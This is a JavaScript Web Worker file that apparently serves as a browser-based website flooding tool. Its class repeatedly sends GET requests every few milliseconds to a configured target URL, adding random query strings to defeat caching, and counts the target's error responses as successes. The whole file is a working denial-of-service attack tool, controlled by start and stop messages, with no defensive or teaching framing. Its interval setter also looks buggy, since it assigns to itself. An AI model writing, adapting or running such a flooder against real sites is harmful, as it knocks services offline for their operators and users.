class BanDera {

    state = {
        requests: {
            total: 0,
            success: 0,
            failed: 0,
            strike: 0
        },
        timer: {
            job: null,
            ui: null
        }
    }

    target = null;
    interval = 50;

    constructor(target, interval = 50) {
        this.target = target;
        this.interval = interval;
    }

    set interval(value) {
        if (value < 10) return;
        console.log('setter works');
        this.interval = value;
        this.restart();
    }

    start() {
        if (!this.isRunning()) {
            // Start job
            this.state.timer.job = setInterval(() => {
                this.makeRequest();
            }, this.interval);

            // Start UI refreshing
            this.state.timer.ui = setInterval(() => {
                postMessage(this.state.requests);
            }, 5000);
        }
    }

    stop() {
        if (this.isRunning()) {
            clearInterval(this.state.timer.job);
            clearInterval(this.state.timer.ui);
        }
    }

    restart() {
        this.stop();
        this.start();
    }

    isRunning() {
        return this.state.timer.job && this.state.timer.ui;
    }

    makeRequest() {
        fetch(this.target.url + this.getRandomParam(), {
            method: 'GET',
            mode: 'no-cors',
            cache: 'no-cache',
            referrerPolicy: "no-referrer",
            expires: 0
        }).catch(
            (error) => {
                if (error.code === 20) {
                    return;
                }
                this.failedRequest();
            }
        ).then(
            (response) => {
                if (response && !response.ok) {
                    this.successRequest();
                    return;
                }
                this.failedRequest();
            }
        );
    }

    successRequest() {
        this.state.requests.total++;
        this.state.requests.success++;
        this.state.requests.strike = 0;
    }

    failedRequest() {
        this.state.requests.total++;
        this.state.requests.failed++;
        this.state.requests.strike++;
    }

    getRandomParam() {
        return '?' + this.getRandomString() + '=' + this.getRandomString();
    }

    getRandomString(minLen = 3, maxLen = 25) {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const len = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;

        let str = '';
        for (let i = 0; i < len; i++) {
            str += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return str;
    }

}

let config = {
    target: null,
    interval: null,
    action: null
}

let bandera = null;

onmessage = function (event) {
    config = {...config, ...event.data };

    if (!bandera && !config.target) return;

    bandera = new BanDera(config.target, config.interval);

    if (config.target) {
        bandera.target = config.target;
    }

    if (config.interval) {
        bandera.interval = config.interval;
    }

    switch (config.action) {
        case 'start':
            bandera.start();
            break;
        case 'stop':
            bandera.stop();
            break;
        case 'restart':
            bandera.restart();
            break;
        default:
            return;
    }
}
